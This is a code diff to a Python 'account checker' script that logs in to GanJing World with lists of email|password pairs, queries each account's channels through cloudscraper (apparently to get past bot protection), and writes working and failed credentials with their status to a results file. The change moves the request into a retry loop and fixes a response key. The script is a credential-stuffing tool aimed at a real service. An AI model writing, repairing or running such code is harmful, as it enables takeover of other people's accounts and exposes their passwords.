@@ -540,16 +540,16 @@ def check_acc(account, total):
                 bad += 1
                 print(f"\033[91m[Good: {good} Bad: {bad} | Total: {total}]{email}|{password}|Wrong password")
                 return
-            s = cloudscraper.create_scraper()
-            h = {
-                    "Content-Type": "application/json",
-                    "Authorization": a.json()["data"]["token"],
-                    }
-            data_channel = s.post("https://gw.ganjingworld.com/v1.0c/get-my-channels", headers=h, json={"lan":"en-US"})
             while True:
+                s = cloudscraper.create_scraper()
+                h = {
+                        "Content-Type": "application/json",
+                        "Authorization": a.json()["data"]["token"],
+                        }
+                data_channel = s.post("https://gw.ganjingworld.com/v1.0c/get-my-channels", headers=h, json={"lan":"en-US"})
                 try:
                     data_channel = data_channel.json()
-                    if data_channel["result"]["data"]["my_channel_is_deleted"] == True:
+                    if data_channel["data"]["my_channel_is_deleted"] == True:
                         open("Result_check_acc.txt", "a", encoding="utf-8").write(f"{email}|{password}|Channel is deleted\n")
                         bad += 1
                         print(f"\033[91m[Good: {good} Bad: {bad} | Total: {total}]{email}|{password}|Channel is deleted")
